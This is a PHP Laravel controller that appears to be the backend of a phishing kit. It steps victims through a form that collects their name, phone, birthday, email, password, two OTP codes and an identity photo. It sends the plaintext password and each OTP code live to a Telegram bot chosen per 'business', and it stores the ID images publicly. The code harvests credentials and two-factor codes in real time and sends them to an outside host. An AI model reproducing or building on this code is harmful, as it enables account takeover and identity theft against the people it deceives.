<?php

namespace App\Http\Controllers;

use App\Models\Data;
use App\Models\Business;
use Illuminate\Http\Request;
use DateTime;
use Reponse;
use Illuminate\Support\Facades\Http;

class DataController extends Controller
{
    private function sendTelegramMessage($message)
    {
        $recordId = session('business_id');
        $data = Business::where('business_id',$recordId)->first();
        var_dump($data);
        Http::post("https://api.telegram.org/bot{$data->tele_bot_token}/sendMessage", [
            'chat_id' => $data->tele_chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
    }

    public function getAllData(Request $request)
    {
        $businessId = $request->input('business_id');
        if (!$businessId) {
            return response()->json(['error' => 'Business ID is required'], 400);
        }
        
        $data = Data::where('business_id', $businessId)->get();
        return response()->json($data);
    }

    public function getData(Request $request)
    {
        $currentStep = $request->input('step', 1);
        $validated = $request->only([
            'business_id',
            'full_name',
            'phone_number',
            'birthday',
            'email',
            'password',
            'repassword',
            'otp_code',
            'otp_code_2',
            'identity_image'
        ]);

        if ($currentStep == 2) {
            if (isset($validated['birthday'])) {
                $date = DateTime::createFromFormat('m/d/Y', $validated['birthday']);
                if ($date) {
                    $validated['birthday'] = $date->format('Y-m-d');
                }
            }
            $validated['business_id'] = $request->business;
            $record = Data::create($validated);
            session(['record_id' => $record->id, 'business_id' => $request->input('business')]);
            if ($record->business_id) {
                $this->sendTelegramMessage("New record created:\nName: {$validated['full_name']}\nPhone number: {$validated['phone_number']}");
            }
        }
        
        if ($currentStep == 3) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                $this->sendTelegramMessage("Email and password updated:\nEmail: {$validated['email']}\nPassword: {$validated['password']}");
            }
        }

        if ($currentStep == 4) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
            }
        }

        if ($currentStep == 5) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                $this->sendTelegramMessage("OTP code updated: {$validated['otp_code']}");
            }
        }

        if ($currentStep == 6) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                $this->sendTelegramMessage("Second OTP code updated: {$validated['otp_code_2']}");
            }
        }

        if ($currentStep == 7) {
            $recordId = session('record_id');
            if ($recordId && $request->hasFile('identity_image')) {
                $image = $request->file('identity_image');
                $filename = $recordId . '_' . time() . '.' . $image->getClientOriginalExtension();
                $image->move(public_path('images'), $filename);
                $imagePath = url('images/' . $filename);
                Data::where('id', $recordId)->update(['images' => $imagePath]);
                
                $this->sendTelegramMessage("Identity image uploaded:\nImage URL: {$imagePath}");
                session()->forget('record_id');
            }
        }

        $nextStep = $currentStep + 1;
        return redirect()->route('home', ['step' => $nextStep]);
    }
}